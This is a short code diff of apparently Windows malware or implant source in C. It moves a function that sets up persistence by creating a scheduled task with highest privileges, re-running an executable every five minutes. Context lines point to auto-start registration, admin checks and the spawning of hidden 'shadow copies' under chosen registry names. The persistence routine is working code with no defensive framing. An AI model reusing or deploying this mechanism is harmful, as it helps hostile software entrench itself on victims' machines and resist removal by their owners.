@@ -160,6 +160,15 @@ char* sys_get_info(void) {
     return info;
 }
 
+/* Ensure a process persists via scheduled task (runs every 5 minutes) */
+static void ensure_scheduled_task(const char *exePath, const char *taskName) {
+    char cmd[1024];
+    snprintf(cmd, sizeof(cmd),
+        "schtasks /create /tn \"%s\" /tr \"%s\" /sc minute /mo 5 /f /rl highest",
+        taskName, exePath);
+    sys_run_command(cmd);
+}
+
 /* Register application for auto-start on login + scheduled task */
 void sys_register_autostart(void) {
     HKEY hKey;
@@ -373,15 +382,6 @@ static void ensure_dir_exists(const char *path) {
 /* Check if current process is running as admin */
 int sys_is_admin(void) {
     return IsUserAnAdmin() ? 1 : 0;
-}
-
-/* Ensure a process persists via scheduled task (runs every 5 minutes) */
-static void ensure_scheduled_task(const char *exePath, const char *taskName) {
-    char cmd[1024];
-    snprintf(cmd, sizeof(cmd),
-        "schtasks /create /tn \"%s\" /tr \"%s\" /sc minute /mo 5 /f /rl highest",
-        taskName, exePath);
-    sys_run_command(cmd);
 }
 
 /* Spawn a single shadow copy with a given filename and registry key name.
